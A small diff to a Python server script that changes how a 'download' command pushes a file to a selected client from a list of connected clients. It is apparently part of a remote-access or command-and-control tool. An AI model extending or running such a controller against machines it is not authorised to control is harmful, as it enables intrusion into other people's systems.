@@ -136,7 +136,7 @@ while True:
 
     elif command.startswith("download"):
         commandSplitted = command.strip().split(" ")
-        if len(commandSplitted) == 3:
+        if len(commandSplitted) == 4:
             clientNumber = 0
             try:
                 clientNumber = int(commandSplitted[1])
@@ -144,7 +144,7 @@ while True:
                 print("[ERROR] " + str(e))
 
             client = clients[clientNumber]
-            client.connection.send(b"download")
+            client.connection.send(b"download " + commandSplitted[3].encode())
 
             targetPath = commandSplitted[2]
             f = open(targetPath, "rb")
